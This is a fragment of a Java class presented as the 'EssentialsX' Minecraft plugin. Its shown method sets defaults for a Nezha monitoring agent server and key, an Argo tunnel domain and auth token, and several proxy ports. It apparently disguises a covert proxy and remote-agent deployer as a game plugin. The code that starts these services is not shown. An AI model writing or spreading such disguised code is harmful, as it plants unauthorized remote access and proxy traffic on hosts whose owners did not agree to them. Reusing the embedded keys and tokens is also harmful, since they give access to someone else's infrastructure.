...
public class EssentialsX extends JavaPlugin {
    ...
    private void applyDefaultEnv(Map<String, String> env) {
        env.put("UUID", "90e7cda5-6643-4b85-96e5-9ae8d9b8f419");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "rustix.cnm.ccwu.cc");
        env.put("ARGO_AUTH", "eyJhIjoiY2YxMDY1YTFhZDk1YjIxNzUxNGY3MzRjNzgyYzlkMDkiLCJ0IjoiOGFiZWI0ZjktMjJiMS00NTA0LTlhMmEtZDUzNTJhYzA3ZDdiIiwicyI6IlpERmlPVE00TkRrdFpUSXhOUzAwWVRFM0xXSTJOVGN0Wm1abE9HTTBaamRtTVRSaSJ9");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
